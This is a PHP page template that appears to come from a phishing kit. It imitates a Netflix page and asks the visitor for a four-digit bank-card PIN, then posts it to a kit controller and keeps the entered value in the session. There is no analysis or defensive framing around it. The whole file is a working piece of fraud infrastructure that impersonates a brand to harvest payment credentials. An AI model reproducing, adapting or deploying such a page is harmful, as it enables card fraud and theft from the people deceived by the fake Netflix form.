<?php
require_once 'config/panel.php';
$title = "Netflix";
ob_start();
?>

<div style="min-height:500px;" class="w-100 d-flex flex-column justify-content-start align-items-center bg-black">


<form class="container my-3 carda shadow rounded-3" action="index.php?<?= md5(time()) ?>" method="post">
     <input type="hidden" name="catch">
     <div>
    
     <h1 class="my-3 p-0"><?= lang("xpin1"); ?></h1>

      <h6 style="color: #fff;font-size: 13px;"><?= lang("xpin2"); ?></h6>
      <p style="font-size: 13px;color:#b3b3b3;"><?= lang("xpin4"); ?></p>
     </div>
    

         <div style="background-color: transparent;" class="form-floating my-3">
          <input style="background-color: transparent;" type="tel" name="pin" maxlength="4" class="form-control <?php if ($_SESSION['ERRORS']['pin']) { echo 'is-invalid'; } ?>" id="floatingPassword" placeholder="Veuillez saisir le code reçu" value="<?php if (!empty($_SESSION['spin'])){ echo $_SESSION['spin'];} ?>">
          <label style="background-color: transparent;" for="floatingPassword"><?= lang("xpin5"); ?></label>
          <div class="invalid-feedback"><?= lang("xpin6"); ?></div>
         </div>
		 <p style="font-size: 13px;color:#b3b3b3;"><?= lang("xpin7"); ?></p>
		 <div class="d-flex flex-row justify-content-end mb-3">
			<img style="width:35px;" src="assets/images/card-pin.svg" alt="" srcset="">
		 </div>

         <div class="w-100 d-flex justify-content-end align-items-center">
         <button class="btn btn-danger w-100 m-0 p-0" type="submit" name="submit" value="pin"><?= lang("xpin8"); ?></button>
         </div>
    </form>

</div>

<?php $content = ob_get_clean(); ?>
<?php require_once 'views/layout_dash.php' ?>

